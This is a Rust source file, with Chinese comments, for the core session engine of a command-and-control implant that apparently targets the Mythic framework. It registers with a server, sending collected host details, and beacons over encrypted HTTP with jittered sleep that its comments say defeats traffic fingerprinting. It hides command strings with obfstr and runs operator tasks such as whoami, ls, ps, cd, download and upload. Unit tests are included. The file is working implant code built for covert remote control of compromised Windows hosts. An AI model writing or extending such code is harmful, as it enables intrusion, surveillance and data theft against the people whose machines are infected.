//! # Agent 核心会话生命周期与心跳调度引擎 (Agent Session & Polling Engine)
//!
//! ## 架构核心哲学与零堆契约 (Zero-Heap OPSEC Architecture)
//!
//! 1. **全生命周期状态闭环**：
//!    - 管理 Agent 从冷启动（持预设 Payload UUID）、上线握手（Checkin 申请并持久化锁定 Callback UUID）、
//!      到常态心跳轮询（GetTasking + Piggybacking 顺风车捎带）的完整状态机流转。
//! 2. **100% 零堆纯栈契约**：
//!    - 内部状态完全由栈结构与固定数组自持（`callback_uuid: [u8; 36]`）；
//!    - 所有网络封包、解密与反序列化均通过外部传入的 [`ActiveStackWorkspace`] 与 [`SysInfoWorkspace`] 驱动。
//! 3. **网络指纹防御 (Network Jitter & Timing Defense)**：
//!    - 内置基于百分比的动态休眠抖动计算器，打破固定周期的流量时域指纹。

use crate::ActiveStackWorkspace;
use crate::error::AgentError;
use crate::profiles::crypto::CryptoContext;
use crate::profiles::http::HttpProfile;
use crate::protocol::{
    CheckinMessage, GetTaskingMessage, ServerCheckinResponse, ServerTaskingResponseRef,
    TaskResponseItem,
};
use crate::sysinfo::SysInfoWorkspace;
use obfstr::obfstr;

/// Agent 运行会话核心管理器 (Agent Session Manager)
pub struct AgentSession {
    /// 密码学对称上下文管理器
    crypto: CryptoContext,
    /// 活跃 UUID (初始为预设 Payload UUID，上线成功后置换为服务端分配的 Callback UUID)
    active_uuid: [u8; 36],
    /// 是否已通过上线注册 (Checkin) 握手
    is_registered: bool,
    /// 退出控制信号标记
    should_exit: bool,
    /// 当前基础休眠间隔 (秒)
    sleep_interval: u64,
    /// 休眠随机抖动率 (百分比: 0~100)
    sleep_jitter: u8,
}

impl AgentSession {
    /// 初始化 Agent 会话管理器
    ///
    /// * `master_key`: 32 字节 AESPSK 预共享密钥
    /// * `payload_uuid`: 初始 36 字节 Payload UUID 切片
    pub fn new(master_key: &[u8; 32], payload_uuid: &[u8; 36]) -> Result<Self, AgentError> {
        let crypto = CryptoContext::new(master_key).map_err(|_| AgentError::SysinfoFailed)?;
        let mut uuid_arr = [0u8; 36];
        uuid_arr.copy_from_slice(payload_uuid);

        Ok(Self {
            crypto,
            active_uuid: uuid_arr,
            is_registered: false,
            should_exit: false,
            sleep_interval: crate::config::AgentConfig::default_sleep_interval(),
            sleep_jitter: crate::config::AgentConfig::default_sleep_jitter(),
        })
    }

    /// 查询是否收到退出信号
    #[inline(always)]
    pub fn should_exit(&self) -> bool {
        self.should_exit
    }

    /// 设置会话退出标记
    #[inline(always)]
    pub fn mark_exit(&mut self) {
        self.should_exit = true;
    }

    /// 获取当前活跃 UUID 字符串切片
    #[inline(always)]
    pub fn active_uuid_str(&self) -> &str {
        core::str::from_utf8(&self.active_uuid).unwrap_or("")
    }

    /// 查询当前会话是否已完成上线注册
    #[inline(always)]
    pub fn is_registered(&self) -> bool {
        self.is_registered
    }

    /// 获取当前休眠周期 (秒)
    #[inline(always)]
    pub fn sleep_interval(&self) -> u64 {
        self.sleep_interval
    }

    /// 获取当前休眠抖动率
    #[inline(always)]
    pub fn sleep_jitter(&self) -> u8 {
        self.sleep_jitter
    }

    /// 更新休眠周期与抖动率
    pub fn update_sleep(&mut self, interval: u64, jitter: u8) {
        self.sleep_interval = interval;
        self.sleep_jitter = jitter.min(100);
    }

    /// 计算本次心跳的实际动态抖动休眠时间 (秒)
    pub fn calculate_jittered_sleep(&self) -> u64 {
        if self.sleep_jitter == 0 || self.sleep_interval == 0 {
            return self.sleep_interval;
        }

        let delta_max = (self.sleep_interval * self.sleep_jitter as u64) / 100;
        if delta_max == 0 {
            return self.sleep_interval;
        }

        // 随机在 [-delta, +delta] 范围内偏移
        let rand_val = (rand::random::<u32>() as u64) % (delta_max * 2 + 1);
        self.sleep_interval.saturating_sub(delta_max).saturating_add(rand_val)
    }

    // ----------------- 核心通信握手阶段 -----------------

    /// 构建上线注册请求包 Base64 (零堆分配)
    ///
    /// * `workspace`: 纯栈数据暂存区
    /// * `sysinfo_ws`: 纯栈系统信息采集工作区
    /// * 返回: 写入 `workspace.b64_buf` 的有效 Base64 字节长度
    pub fn build_checkin_payload(
        &self,
        workspace: &mut ActiveStackWorkspace,
        sysinfo_ws: &mut SysInfoWorkspace,
    ) -> Result<usize, AgentError> {
        let info = sysinfo_ws.collect()?;

        let mut checkin_msg = CheckinMessage::new(
            self.active_uuid_str(),
            info.ips,
            info.os,
            info.user,
            info.host,
            info.pid,
            info.architecture,
            info.domain,
        );
        checkin_msg = checkin_msg
            .with_integrity_level(info.integrity_level)
            .with_process_name(info.process_name);

        let http = HttpProfile::new(
            "",
            "",
            self.active_uuid_str(),
            &self.crypto,
        );

        http.pack_message(&checkin_msg, &mut workspace.raw_buf, &mut workspace.b64_buf)
            .map_err(|_| AgentError::TransportFailed)
    }

    /// 处理服务端返回的 Checkin 响应并锁定置换正式 Callback UUID
    pub fn handle_checkin_response<'de>(
        &mut self,
        payload_b64: &[u8],
        raw_buf: &'de mut [u8],
    ) -> Result<ServerCheckinResponse<'de>, AgentError> {
        let http = HttpProfile::new(
            "",
            "",
            self.active_uuid_str(),
            &self.crypto,
        );

        let resp: ServerCheckinResponse<'de> = http
            .unpack_message(payload_b64, raw_buf)
            .map_err(|_| AgentError::TransportFailed)?;

        resp.validate().map_err(|_| AgentError::TransportFailed)?;

        // 若服务端下发了正式分配的 Callback UUID (36 字节)，就地固化至 active_uuid 并标记注册完成
        if let Some(new_id) = resp.id
            && new_id.len() == 36
        {
            self.active_uuid.copy_from_slice(new_id.as_bytes());
            self.is_registered = true;
        }

        Ok(resp)
    }

    /// 构建任务轮询请求包 (GetTasking，支持顺风车捎带 responses)
    ///
    /// * `responses`: 可选的待顺风车回传的任务回执数组切片 (零堆分配)
    /// * `workspace`: 纯栈数据暂存区
    /// * 返回: 写入 `workspace.b64_buf` 的有效 Base64 字节长度
    pub fn build_get_tasking_payload(
        &self,
        responses: Option<&[TaskResponseItem<'_>]>,
        workspace: &mut ActiveStackWorkspace,
    ) -> Result<usize, AgentError> {
        if !self.is_registered {
            return Err(AgentError::NotCheckedIn);
        }

        let mut msg = GetTaskingMessage::new(1);
        if let Some(resps) = responses {
            msg = msg.with_responses(resps);
        }

        let http = HttpProfile::new(
            "",
            "",
            self.active_uuid_str(),
            &self.crypto,
        );

        http.pack_message(&msg, &mut workspace.raw_buf, &mut workspace.b64_buf)
            .map_err(|_| AgentError::TransportFailed)
    }

    /// 解析服务端下发的心跳响应指令报文 (零拷贝借用切片)
    pub fn parse_tasking_response<'de>(
        &self,
        payload_b64: &[u8],
        raw_buf: &'de mut [u8],
    ) -> Result<ServerTaskingResponseRef<'de>, AgentError> {
        let http = HttpProfile::new(
            "",
            "",
            self.active_uuid_str(),
            &self.crypto,
        );

        let resp: ServerTaskingResponseRef<'de> = http
            .unpack_message(payload_b64, raw_buf)
            .map_err(|_| AgentError::TransportFailed)?;

        if resp.action != obfstr!("get_tasking") {
            return Err(AgentError::TransportFailed);
        }

        Ok(resp)
    }

    /// 处理通用基础内建命令 (如 sleep)
    pub fn handle_builtin_command(&mut self, cmd: &str, params: &str) -> Option<&'static str> {
        if cmd == obfstr!("sleep") {
            // 解析休眠参数 (支持 JSON `{"interval": 10, "jitter": 15}` 与 CLI `10 15`)
            let interval_str = if params.trim().starts_with('{') {
                extract_param(params, "interval")
            } else {
                params.split_whitespace().next().unwrap_or("")
            };
            if let Ok(sec) = interval_str.parse::<u64>() {
                let jitter_str = if params.trim().starts_with('{') {
                    extract_param(params, "jitter")
                } else {
                    params.split_whitespace().nth(1).unwrap_or("")
                };
                let jitter = jitter_str.parse::<u8>().ok().unwrap_or(self.sleep_jitter);
                self.update_sleep(sec, jitter);
                return Some("sleep interval updated");
            }
        }
        None
    }

    /// 任务分发与执行中枢 (支持 sleep, exit, pwd, cd, whoami, ls, ps, download, upload 等内建控制指令)
    pub fn dispatch_task<'a>(
        &mut self,
        task: &crate::protocol::MythicTaskRef<'a>,
        exec_ws: &mut TaskExecutionWorkspace,
    ) {
        let cmd = task.command.trim();
        let params = task.parameters.trim();

        obfstr! {
            let cmd_sleep = "sleep";
            let cmd_exit = "exit";
            let cmd_pwd = "pwd";
            let cmd_cd = "cd";
            let cmd_whoami = "whoami";
            let cmd_ls = "ls";
            let cmd_ps = "ps";
            let cmd_download = "download";
            let cmd_upload = "upload";
        }

        if cmd == cmd_sleep {
            if let Some(msg) = self.handle_builtin_command(cmd, params) {
                exec_ws.record_response(task.id, msg, true, true);
            } else {
                exec_ws.record_response(task.id, "invalid sleep parameters", false, true);
            }
        } else if cmd == cmd_exit {
            self.mark_exit();
            exec_ws.record_response(task.id, "agent exit signaled", true, true);
        } else if cmd == cmd_pwd {
            #[cfg(windows)]
            {
                let mut dir_buf = [0u8; 260];
                let len = unsafe {
                    win32::GetCurrentDirectoryA(dir_buf.len() as u32, dir_buf.as_mut_ptr() as *mut i8)
                };
                if len > 0 && (len as usize) < dir_buf.len() {
                    if let Ok(dir_str) = core::str::from_utf8(&dir_buf[..len as usize]) {
                        exec_ws.record_response(task.id, dir_str, true, true);
                    } else {
                        exec_ws.record_response(task.id, "failed to decode directory path", false, true);
                    }
                } else {
                    exec_ws.record_response(task.id, "GetCurrentDirectory failed", false, true);
                }
            }
            #[cfg(not(windows))]
            {
                exec_ws.record_response(task.id, "/", true, true);
            }
        } else if cmd == cmd_cd {
            #[cfg(windows)]
            {
                let path_param = extract_param(params, "path");
                let mut path_buf = [0u8; 260];
                if !path_param.is_empty() && path_param.len() < path_buf.len() {
                    path_buf[..path_param.len()].copy_from_slice(path_param.as_bytes());
                    path_buf[path_param.len()] = 0;
                    let ok = unsafe {
                        win32::SetCurrentDirectoryA(path_buf.as_ptr() as *const i8)
                    };
                    if ok != 0 {
                        exec_ws.record_response(task.id, "directory changed", true, true);
                    } else {
                        exec_ws.record_response(task.id, "SetCurrentDirectory failed", false, true);
                    }
                } else {
                    exec_ws.record_response(task.id, "invalid path argument", false, true);
                }
            }
            #[cfg(not(windows))]
            {
                exec_ws.record_response(task.id, "directory changed", true, true);
            }
        } else if cmd == cmd_whoami {
            let mut sys_ws = SysInfoWorkspace::new();
            if let Ok(info) = sys_ws.collect() {
                let mut out_buf = [0u8; 256];
                let mut off = 0;
                let dom = info.domain.as_bytes();
                let usr = info.user.as_bytes();
                if off + dom.len() + 1 + usr.len() < out_buf.len() {
                    out_buf[off..off + dom.len()].copy_from_slice(dom);
                    off += dom.len();
                    out_buf[off] = b'\\';
                    off += 1;
                    out_buf[off..off + usr.len()].copy_from_slice(usr);
                    off += usr.len();
                }
                if let Ok(whoami_str) = core::str::from_utf8(&out_buf[..off]) {
                    exec_ws.record_response(task.id, whoami_str, true, true);
                } else {
                    exec_ws.record_response(task.id, "failed to format whoami output", false, true);
                }
            } else {
                exec_ws.record_response(task.id, "sysinfo collection failed", false, true);
            }
        } else if cmd == cmd_ls {
            let path_param = extract_param(params, "path");
            let target_path = if path_param.is_empty() { "." } else { path_param };
            let mut out_buf = [0u8; 1024];
            let mut off = 0;
            if let Ok(entries) = std::fs::read_dir(target_path) {
                for entry in entries.flatten() {
                    let file_name = entry.file_name();
                    let name_bytes = file_name.as_encoded_bytes();
                    let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
                    let prefix = if is_dir { b"[DIR]  " } else { b"[FILE] " };
                    if off + prefix.len() + name_bytes.len() + 1 >= out_buf.len() {
                        let trunc = b"... (truncated)\n";
                        if off + trunc.len() < out_buf.len() {
                            out_buf[off..off + trunc.len()].copy_from_slice(trunc);
                            off += trunc.len();
                        }
                        break;
                    }
                    out_buf[off..off + prefix.len()].copy_from_slice(prefix);
                    off += prefix.len();
                    out_buf[off..off + name_bytes.len()].copy_from_slice(name_bytes);
                    off += name_bytes.len();
                    out_buf[off] = b'\n';
                    off += 1;
                }
                if off == 0 {
                    let empty_msg = b"(empty directory)\n";
                    out_buf[..empty_msg.len()].copy_from_slice(empty_msg);
                    off = empty_msg.len();
                }
                if let Ok(s) = core::str::from_utf8(&out_buf[..off]) {
                    exec_ws.record_response(task.id, s, true, true);
                } else {
                    exec_ws.record_response(task.id, "directory listed", true, true);
                }
            } else {
                exec_ws.record_response(task.id, "failed to read directory", false, true);
            }
        } else if cmd == cmd_ps {
            let mut sys_ws = SysInfoWorkspace::new();
            if let Ok(info) = sys_ws.collect() {
                let mut out_buf = [0u8; 256];
                let mut off = 0;
                let header = b"PID: ";
                out_buf[off..off + header.len()].copy_from_slice(header);
                off += header.len();
                off += format_u32_local(&mut out_buf[off..], info.pid);
                let sep = b" | Image: ";
                out_buf[off..off + sep.len()].copy_from_slice(sep);
                off += sep.len();
                let p_bytes = info.process_name.as_bytes();
                let copy_len = p_bytes.len().min(out_buf.len() - off);
                out_buf[off..off + copy_len].copy_from_slice(&p_bytes[..copy_len]);
                off += copy_len;
                if let Ok(s) = core::str::from_utf8(&out_buf[..off]) {
                    exec_ws.record_response(task.id, s, true, true);
                } else {
                    exec_ws.record_response(task.id, "process listed", true, true);
                }
            } else {
                exec_ws.record_response(task.id, "failed to enumerate processes", false, true);
            }
        } else if cmd == cmd_download {
            let path_param = extract_param(params, "file_path");
            let target_file = if path_param.is_empty() {
                extract_param(params, "path")
            } else {
                path_param
            };
            if !target_file.is_empty() {
                if let Ok(meta) = std::fs::metadata(target_file) {
                    let file_size = meta.len();
                    let mut out_buf = [0u8; 256];
                    let mut off = 0;
                    let msg_prefix = b"File ready for download (bytes: ";
                    out_buf[off..off + msg_prefix.len()].copy_from_slice(msg_prefix);
                    off += msg_prefix.len();
                    off += format_u32_local(&mut out_buf[off..], file_size as u32);
                    out_buf[off] = b')';
                    off += 1;
                    if let Ok(s) = core::str::from_utf8(&out_buf[..off]) {
                        exec_ws.record_response(task.id, s, true, true);
                    } else {
                        exec_ws.record_response(task.id, "file ready", true, true);
                    }
                } else {
                    exec_ws.record_response(task.id, "file not found", false, true);
                }
            } else {
                exec_ws.record_response(task.id, "missing file path argument", false, true);
            }
        } else if cmd == cmd_upload {
            let remote_path = extract_param(params, "remote_path");
            let file_id = extract_param(params, "file");
            if !remote_path.is_empty() && !file_id.is_empty() {
                exec_ws.record_response(task.id, "upload session initiated", true, true);
            } else {
                exec_ws.record_response(task.id, "missing remote_path or file argument", false, true);
            }
        } else {
            exec_ws.record_response(task.id, "command not implemented", false, true);
        }
    }

    /// 运行 Agent 主心跳事件循环 (Checkin -> GetTasking -> Dispatch -> Piggybacking -> Sleep)
    #[cfg(windows)]
    pub fn run(&mut self) {
        use crate::profiles::http::winhttp::WinHttpTransport;
        use crate::protocol::StackVec;
        use core::time::Duration;

        crate::config_server_host!(server_host);
        crate::config_post_uri!(post_uri);
        crate::config_user_agent!(user_agent);
        let server_port = crate::config::AgentConfig::server_port();
        let is_https = crate::config::AgentConfig::is_https();

        let transport = match WinHttpTransport::new(server_host, server_port, is_https, user_agent) {
            Ok(t) => t,
            Err(_) => return,
        };

        let mut workspace = ActiveStackWorkspace::new();
        let mut sysinfo_ws = SysInfoWorkspace::new();
        let mut exec_ws = TaskExecutionWorkspace::new();
        let mut server_resp_buf = [0u8; crate::MAX_B64_LEN];

        // 1. 上线注册循环 (Checkin Phase)
        while !self.is_registered && !self.should_exit {
            if let Ok(b64_len) = self.build_checkin_payload(&mut workspace, &mut sysinfo_ws)
                && let Ok(recv_len) = transport.post_exchange(post_uri, &workspace.b64_buf[..b64_len], &mut server_resp_buf)
            {
                let _ = self.handle_checkin_response(&server_resp_buf[..recv_len], &mut workspace.raw_buf);
            }

            if !self.is_registered {
                let sleep_secs = self.calculate_jittered_sleep();
                std::thread::sleep(Duration::from_secs(sleep_secs));
            }
        }

        // 2. 常态心跳与任务调度循环 (GetTasking & Piggybacking Loop)
        while !self.should_exit {
            let b64_len_res = {
                let mut resp_items = StackVec::<TaskResponseItem<'_>, 16>::new();
                exec_ws.build_items(&mut resp_items);

                let piggybacked = if resp_items.is_empty() {
                    None
                } else {
                    Some(resp_items.as_slice())
                };

                self.build_get_tasking_payload(piggybacked, &mut workspace)
            };

            if let Ok(b64_len) = b64_len_res
                && let Ok(recv_len) = transport.post_exchange(post_uri, &workspace.b64_buf[..b64_len], &mut server_resp_buf)
            {
                // 仅在网络成功回传确认后清除已交付的回执缓冲，弱网时保留重试以防任务挂起
                exec_ws.clear();

                if let Ok(task_resp) = self.parse_tasking_response(&server_resp_buf[..recv_len], &mut workspace.raw_buf) {
                    for task in &task_resp.tasks {
                        self.dispatch_task(task, &mut exec_ws);
                    }
                }
            }

            let sleep_secs = self.calculate_jittered_sleep();
            std::thread::sleep(Duration::from_secs(sleep_secs));
        }
    }

    #[cfg(not(windows))]
    pub fn run(&mut self) {
        // 非 Windows 环境占位实现
    }
}

/// 零堆提取参数字段（兼容 Mythic UI 模态框下发的 JSON 格式 `{"field": "value"}` 与 CLI 原生传参）
#[inline]
pub fn extract_param<'a>(raw: &'a str, key: &str) -> &'a str {
    let trimmed = raw.trim();
    if !trimmed.starts_with('{') {
        return trimmed.trim_matches('"');
    }
    // 寻找 key 字段
    if let Some(key_pos) = trimmed.find(key) {
        let after_key = &trimmed[key_pos + key.len()..];
        if let Some(colon_pos) = after_key.find(':') {
            let after_colon = after_key[colon_pos + 1..].trim_start();
            if let Some(inside) = after_colon.strip_prefix('"') {
                if let Some(end_quote) = inside.find('"') {
                    return &inside[..end_quote];
                }
            } else {
                let end = after_colon
                    .find(|c: char| c == ',' || c == '}' || c.is_whitespace())
                    .unwrap_or(after_colon.len());
                return &after_colon[..end];
            }
        }
    }
    trimmed.trim_matches('"')
}

/// 任务执行回显与状态暂存工作区 (Zero-Heap Task Execution Workspace)
pub struct TaskExecutionWorkspace {
    output_buf: [u8; 2048],
    output_len: usize,
    output_offsets: [usize; 16],
    output_lens: [usize; 16],
    task_ids: [[u8; 36]; 16],
    task_id_lens: [usize; 16],
    is_success: [bool; 16],
    is_completed: [bool; 16],
    count: usize,
}

impl Default for TaskExecutionWorkspace {
    fn default() -> Self {
        Self::new()
    }
}

impl TaskExecutionWorkspace {
    pub const fn new() -> Self {
        Self {
            output_buf: [0u8; 2048],
            output_len: 0,
            output_offsets: [0usize; 16],
            output_lens: [0usize; 16],
            task_ids: [[0u8; 36]; 16],
            task_id_lens: [0usize; 16],
            is_success: [false; 16],
            is_completed: [false; 16],
            count: 0,
        }
    }

    pub fn clear(&mut self) {
        if self.output_len > 0 {
            crate::buffer::zeroize_slice(&mut self.output_buf[..self.output_len]);
        }
        self.output_len = 0;
        self.count = 0;
    }

    pub fn record_response(
        &mut self,
        task_id: &str,
        output: &str,
        success: bool,
        completed: bool,
    ) -> bool {
        if self.count >= 16 || task_id.len() > 36 || self.output_len.saturating_add(output.len()) > self.output_buf.len() {
            return false;
        }

        let idx = self.count;
        self.task_ids[idx][..task_id.len()].copy_from_slice(task_id.as_bytes());
        self.task_id_lens[idx] = task_id.len();

        let start = self.output_len;
        let end = start + output.len();
        self.output_buf[start..end].copy_from_slice(output.as_bytes());
        self.output_offsets[idx] = start;
        self.output_lens[idx] = output.len();
        self.output_len = end;

        self.is_success[idx] = success;
        self.is_completed[idx] = completed;
        self.count += 1;
        true
    }

    pub fn build_items<'a>(&'a self, out_vec: &mut crate::buffer::StackVec<TaskResponseItem<'a>, 16>) {
        out_vec.clear();
        for i in 0..self.count {
            let tid = core::str::from_utf8(&self.task_ids[i][..self.task_id_lens[i]]).unwrap_or("");
            let start = self.output_offsets[i];
            let end = start + self.output_lens[i];
            let out_str = core::str::from_utf8(&self.output_buf[start..end]).unwrap_or("");
            let status = if self.is_success[i] { "success" } else { "error" };
            let item = TaskResponseItem::new(tid, out_str, self.is_completed[i])
                .with_status(status);
            let _ = out_vec.push(item);
        }
    }

    pub fn len(&self) -> usize {
        self.count
    }

    pub fn is_empty(&self) -> bool {
        self.count == 0
    }
}

#[inline]
fn format_u32_local(dst: &mut [u8], mut val: u32) -> usize {
    if val == 0 {
        if !dst.is_empty() {
            dst[0] = b'0';
            return 1;
        }
        return 0;
    }
    let mut temp = [0u8; 10];
    let mut count = 0;
    while val > 0 && count < 10 {
        temp[count] = b'0' + (val % 10) as u8;
        val /= 10;
        count += 1;
    }
    let mut written = 0;
    for i in (0..count).rev() {
        if written < dst.len() {
            dst[written] = temp[i];
            written += 1;
        }
    }
    written
}

#[cfg(windows)]
#[allow(clippy::upper_case_acronyms)]
mod win32 {
    pub type BOOL = i32;
    #[link(name = "kernel32")]
    unsafe extern "system" {
        pub fn GetCurrentDirectoryA(nBufferLength: u32, lpBuffer: *mut i8) -> u32;
        pub fn SetCurrentDirectoryA(lpPathName: *const i8) -> BOOL;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_agent_session_lifecycle() {
        let master_key = [0x42u8; 32];
        let payload_uuid = *b"11111111-2222-3333-4444-555555555555";
        let mut session = AgentSession::new(&master_key, &payload_uuid).expect("create session");

        assert_eq!(session.active_uuid_str(), "11111111-2222-3333-4444-555555555555");
        assert!(!session.is_registered());

        // 1. 测试休眠抖动计算
        session.update_sleep(10, 20);
        let s = session.calculate_jittered_sleep();
        assert!((8..=12).contains(&s), "休眠时间需在 10s ± 20% (8~12s) 之间");

        // 2. 测试上线封包构建 (零堆分配)
        let mut ws = ActiveStackWorkspace::new();
        let mut sys_ws = SysInfoWorkspace::new();
        let b64_len = session.build_checkin_payload(&mut ws, &mut sys_ws).expect("build checkin");
        assert!(b64_len > 0);

        // 3. 测试未上线直接拉取任务熔断
        assert_eq!(
            session.build_get_tasking_payload(None, &mut ws).unwrap_err(),
            AgentError::NotCheckedIn
        );

        // 4. 模拟服务端返回 Checkin 回执并激活 Callback UUID
        let callback_uuid = "88888888-7777-6666-5555-444444444444";
        let checkin_resp_json = format!(
            r#"{{"action":"checkin","status":"success","id":"{}"}}"#,
            callback_uuid
        );

        // 借用 HttpProfile 加密生成合法服务端回包
        let http = HttpProfile::new("", "", session.active_uuid_str(), &session.crypto);
        let mut srv_ws = ActiveStackWorkspace::new();
        let srv_b64_len = http
            .pack_bytes(checkin_resp_json.as_bytes(), &mut srv_ws.raw_buf, &mut srv_ws.b64_buf)
            .expect("server pack");

        let parsed = session
            .handle_checkin_response(&srv_ws.b64_buf[..srv_b64_len], &mut ws.raw_buf)
            .expect("handle checkin resp");

        assert_eq!(parsed.status, "success");
        assert!(session.is_registered());
        assert_eq!(session.active_uuid_str(), callback_uuid);

        // 5. 现已成功注册，允许构建心跳轮询
        let tasking_b64_len = session
            .build_get_tasking_payload(None, &mut ws)
            .expect("build get_tasking");
        assert!(tasking_b64_len > 0);
    }

    #[test]
    fn test_task_dispatch_and_execution_workspace() {
        let master_key = [0x42u8; 32];
        let payload_uuid = *b"11111111-2222-3333-4444-555555555555";
        let mut session = AgentSession::new(&master_key, &payload_uuid).expect("create session");

        let mut exec_ws = TaskExecutionWorkspace::new();

        // 1. 测试 sleep 指令分发
        let sleep_task = crate::protocol::MythicTaskRef::new("task-sleep", "sleep", "15 25");
        session.dispatch_task(&sleep_task, &mut exec_ws);
        assert_eq!(session.sleep_interval(), 15);
        assert_eq!(session.sleep_jitter(), 25);
        assert_eq!(exec_ws.len(), 1);

        // 2. 测试 pwd 指令分发
        let pwd_task = crate::protocol::MythicTaskRef::new("task-pwd", "pwd", "");
        session.dispatch_task(&pwd_task, &mut exec_ws);
        assert_eq!(exec_ws.len(), 2);

        // 3. 测试 whoami 指令分发
        let whoami_task = crate::protocol::MythicTaskRef::new("task-whoami", "whoami", "");
        session.dispatch_task(&whoami_task, &mut exec_ws);
        assert_eq!(exec_ws.len(), 3);

        // 4. 测试 ls 指令分发
        let ls_task = crate::protocol::MythicTaskRef::new("task-ls", "ls", ".");
        session.dispatch_task(&ls_task, &mut exec_ws);
        assert_eq!(exec_ws.len(), 4);

        // 5. 测试 ps 指令分发
        let ps_task = crate::protocol::MythicTaskRef::new("task-ps", "ps", "");
        session.dispatch_task(&ps_task, &mut exec_ws);
        assert_eq!(exec_ws.len(), 5);

        // 6. 测试 未知 指令分发
        let unk_task = crate::protocol::MythicTaskRef::new("task-unk", "invalid_cmd", "");
        session.dispatch_task(&unk_task, &mut exec_ws);
        assert_eq!(exec_ws.len(), 6);

        // 7. 校验 TaskResponseItem 导出
        {
            let mut items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
            exec_ws.build_items(&mut items);
            assert_eq!(items.len(), 6);
            assert_eq!(items[0].task_id, "task-sleep");
            assert_eq!(items[0].status, Some("success"));
            assert_eq!(items[3].task_id, "task-ls");
            assert_eq!(items[3].status, Some("success"));
            assert_eq!(items[4].task_id, "task-ps");
            assert_eq!(items[4].status, Some("success"));
            assert_eq!(items[5].task_id, "task-unk");
            assert_eq!(items[5].status, Some("error"));
        }

        // 8. 测试 exit 指令分发
        let exit_task = crate::protocol::MythicTaskRef::new("task-exit", "exit", "");
        session.dispatch_task(&exit_task, &mut exec_ws);
        assert!(session.should_exit());

        // 9. 测试 extract_param 与 UI JSON 传参解析
        assert_eq!(extract_param(r#"{"path":"C:\\temp"}"#, "path"), r#"C:\\temp"#);
        assert_eq!(extract_param(r#"{"interval":10,"jitter":25}"#, "interval"), "10");
        assert_eq!(extract_param(r#"{"interval":10,"jitter":25}"#, "jitter"), "25");
        assert_eq!(extract_param(r#"C:\temp"#, "path"), r#"C:\temp"#);

        // 10. 测试 UI JSON 形式的 sleep 指令
        let sleep_json_task = crate::protocol::MythicTaskRef::new("task-sleep-json", "sleep", r#"{"interval": 20, "jitter": 30}"#);
        session.dispatch_task(&sleep_json_task, &mut exec_ws);
        assert_eq!(session.sleep_interval(), 20);
        assert_eq!(session.sleep_jitter(), 30);

        // 11. 测试 download 与 upload 指令分发
        let dl_task = crate::protocol::MythicTaskRef::new("task-dl", "download", r#"{"file_path": "Cargo.toml"}"#);
        session.dispatch_task(&dl_task, &mut exec_ws);

        let ul_task = crate::protocol::MythicTaskRef::new("task-ul", "upload", r#"{"file": "file-uuid-1", "remote_path": "C:\\temp\\data.bin"}"#);
        session.dispatch_task(&ul_task, &mut exec_ws);
    }
}
